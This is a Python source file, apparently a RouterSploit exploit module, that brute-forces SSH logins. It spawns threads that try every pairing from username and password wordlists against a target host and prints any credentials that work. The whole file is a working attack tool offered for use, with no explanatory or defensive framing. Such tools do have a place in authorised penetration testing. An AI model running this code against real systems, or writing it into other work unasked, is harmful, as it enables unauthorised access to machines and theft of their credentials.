import threading
import itertools
import socket
import paramiko

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    boolify,
    multi,
)


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against SSH service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'SSH Bruteforce',
        'description': 'Module performs bruteforce attack against SSH service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            '',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(22, 'Target port')

    threads = exploits.Option(8, 'Number of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
    verbosity = exploits.Option('yes', 'Display authentication attempts')
    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        ssh = paramiko.SSHClient()

        try:
            ssh.connect(self.target, port=self.port)
        except socket.error:
            print_error("Connection error: %s:%s" % (self.target, str(self.port)))
            ssh.close()
            return
        except Exception:
            pass

        ssh.close()

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print_status(name, 'thread is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                user, password = data.next()
                user = user.strip()
                password = password.strip()
                ssh.connect(self.target, int(self.port), timeout=5, username=user, password=password)
            except StopIteration:
                break
            except paramiko.ssh_exception.SSHException as err:
                ssh.close()
                print_error("Target: {}:{} {}: {} Username: '{}' Password: '{}'".format(self.target, self.port, name, err, user, password), verbose=module_verbosity)
            else:
                if boolify(self.stop_on_success):
                    running.clear()

                print_success("Target: {}:{} {} Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                self.credentials.append((self.target, self.port, user, password))

        print_status(name, 'thread is terminated.', verbose=module_verbosity)
